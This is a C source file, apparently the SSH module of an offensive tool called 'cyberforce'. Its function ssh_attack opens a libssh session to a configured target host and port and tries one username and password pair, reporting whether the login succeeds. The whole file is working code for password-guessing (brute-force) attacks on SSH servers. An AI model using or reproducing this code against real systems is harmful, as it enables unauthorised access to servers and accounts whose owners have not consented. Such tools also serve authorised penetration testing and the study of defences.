#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libssh/libssh.h>
#include "include/cyberforce.h"
#include "include/defines.h"

int ssh_attack(Config *config, const char *username, const char *password, AttackResult *result) {
    ssh_session session;
    int rc;
    int success = 0;
    
    // Create SSH session
    session = ssh_new();
    if (!session) {
        if (config->verbose >= 1) {
            fprintf(stderr, "[-] Failed to create SSH session\n");
        }
        return 0;
    }
    
    // Set SSH options
    ssh_options_set(session, SSH_OPTIONS_HOST, config->target);
    ssh_options_set(session, SSH_OPTIONS_PORT, &config->port);
    ssh_options_set(session, SSH_OPTIONS_USER, username);
    ssh_options_set(session, SSH_OPTIONS_TIMEOUT, &config->timeout);
    
    // Connect to server
    rc = ssh_connect(session);
    if (rc != SSH_OK) {
        if (config->verbose >= 2) {
            fprintf(stderr, "[-] SSH connection failed: %s\n", ssh_get_error(session));
        }
        ssh_free(session);
        return 0;
    }
    
    // Try password authentication
    rc = ssh_userauth_password(session, NULL, password);
    if (rc == SSH_AUTH_SUCCESS) {
        success = 1;
    } else if (rc == SSH_AUTH_DENIED) {
        success = 0;
    } else {
        if (config->verbose >= 2) {
            fprintf(stderr, "[-] SSH authentication error: %s\n", ssh_get_error(session));
        }
        success = 0;
    }
    
    // Disconnect
    ssh_disconnect(session);
    ssh_free(session);
    
    return success;
}